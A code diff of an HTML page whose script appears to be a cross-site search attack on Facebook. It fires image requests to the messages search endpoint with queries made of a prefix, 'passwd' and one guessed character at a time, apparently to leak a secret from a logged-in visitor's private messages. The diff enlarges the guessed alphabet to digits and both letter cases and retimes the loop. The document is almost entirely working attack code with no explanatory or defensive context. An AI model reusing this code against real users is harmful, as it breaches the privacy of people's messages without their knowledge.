@@ -1,13 +1,14 @@
 <html>
 <body>
 <script>
-var letter_alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
-var num_alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
+var digit = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
+var lowercase = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
+var uppercase = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']; 
 var pref;
 var ref;
-var alpha = num_alphabet;
-var ch = alpha[0];
+var alpha = digit.concat(lowercase.concat(uppercase));
 var j = 0;
+alpha_counter = 0;
 
 function get_alpha(ch, alphabet) {
 	for (i=0; i< alphabet.length; i++) {
@@ -18,21 +19,22 @@ function get_alpha(ch, alphabet) {
 }
 
 function makeRequest() {
-	if (ch > alpha[alpha.length - 1]) {
-		ch = alpha[0];
+	if (alpha_counter > alpha.length - 1) {
+		alpha_counter = 0;
 		j++;
 	}
 	pref = "rynmkwi!";
+	ch = alpha[alpha_counter];
 	get_alpha(ch, alpha);
-	ref = "passwd";
+	ref = 'passwd';
 	post_ref = "znq";
 	var img = new Image();
 	img.src= "https://touch.facebook.com/messages/?q=" + pref + ref + ch + post_ref;
-	ch = String.fromCharCode(ch.charCodeAt(0) + 1);
-		
+	alpha_counter++;
+
 	console.log("making request %d", j);
 
-	setTimeout(makeRequest, 2000);
+	setTimeout(makeRequest, 4000);
 }
 
 makeRequest();
